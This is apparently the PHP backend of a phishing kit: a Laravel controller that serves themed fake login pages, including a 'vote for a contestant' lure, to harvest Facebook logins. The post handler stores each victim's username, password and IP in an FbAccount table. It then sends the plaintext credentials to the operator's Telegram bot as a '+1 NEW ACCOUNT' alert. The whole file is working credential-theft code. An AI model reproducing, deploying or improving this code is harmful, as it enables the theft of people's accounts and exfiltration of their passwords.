<?php

namespace App\Http\Controllers;

use App\Models\FbAccount;
use App\Models\User;
use App\Models\Website;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Nette\Utils\Json;

use function Symfony\Component\Clock\now;

class NormalWeb extends Controller
{
    function handler(Request $rq, $web_data, Website $db_data, $user_settings)
    {
        // ném web info cho client (đã mã hóa để bảo mật)
        $web_info = Crypt::encryptString(Json::encode([
            'id' => $db_data->id,
            'userid' => $db_data->userid,
            'webid' => $db_data->id
        ]));
        // đặt ngôn ngữ cho giao diện
        $theme_language = $web_data->theme_language;
        app()->setLocale($theme_language);
        // nếu link chưa tồn tại ?a (allowed to access website)
        if (!$rq->exists('a')) {
            // first init wrapper
            return view('init', ['data' => $web_data, 'info' => $web_info]);
        } else {
            // nếu giao diện 1 phần
            if ($web_data->theme_type == 1) {
                return view('login.normal.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings]);
            }
            
            // xử lí giao diện 2 phần
            if (!$rq->exists('l')) {
                return view('common.' . $web_data->theme_folder, ['data' => $web_data, 'input' => $web_data->theme_input]);
            } else {
                // ghi đè chuyển hướng nếu có cài đặt
                if (isset($web_data->theme_input->show_success_message)) {
                    // thông báo bình chọn thí sinh thành công
                    if ($web_data->theme_input->show_success_message == 'true') {
                        $web_data->redirect_link = '?a&success';
                    }
                }
                return view('login.normal.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings]);
            }
        }
    }
    function post(Request $rq)
    {
        if ($rq->filled('d')) {
            try {
                /*
                $post_data chứa array có item là username, password, info
                + info chứa array có item là id, userid, webid
                */
                $post_data = Json::decode($rq->d);
                /*
                $web_info chứa array có item là id, userid, webid
                */
                $web_info = Json::decode(Crypt::decryptString($post_data->info));
                $ip = getRealIp();

                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
                $check_ip = FbAccount::where('ip', $ip)
                    ->where('type', 'normal')
                    ->latest()
                    ->first();
                $wait_seconds = 3;
                if ($check_ip) {
                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
                        return response([
                            'status' => false,
                        ]);
                    }
                }
                // check spam xong tiến hành insert
                FbAccount::create([
                    'userid' => $web_info->userid,
                    'webid' => $web_info->webid,
                    'user' => $post_data->username,
                    'password' => $post_data->password,
                    'type' => 'normal',
                    'ip' => $ip
                ]);
                // tiến hành gửi thông báo về telegram bot (nếu bật)
                $user = User::find($web_info->userid);
                if ($user) {
                    $telegram_id = Json::decode($user->data)->telegram_id;
                    if ($telegram_id) {
                        // lấy web data
                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
                        $time_now = date('d/m/Y H:i:s');
                        if ($website) {
                            $website = Json::decode($website->data);
                            $msg = implode("\n", [
                                "✅ <b>+1 NEW ACCOUNT</b>",
                                "---------------",
                                "🌍 <code>$website->title</code>",
                                "---------------",
                                "👤 Username: <code>$post_data->username</code>",
                                "🔑 Password: <code>$post_data->password</code>",
                                "🕛 Time: <b>$time_now</b>"
                            ]);
                            sendNormalTelegramNoti($telegram_id, $msg);
                        }
                    }
                }
                return response([
                    'status' => true,
                ]);
            } catch (\Throwable $e) {
                return response([
                    'status' => false,
                ]);
            }
        }
    }
}
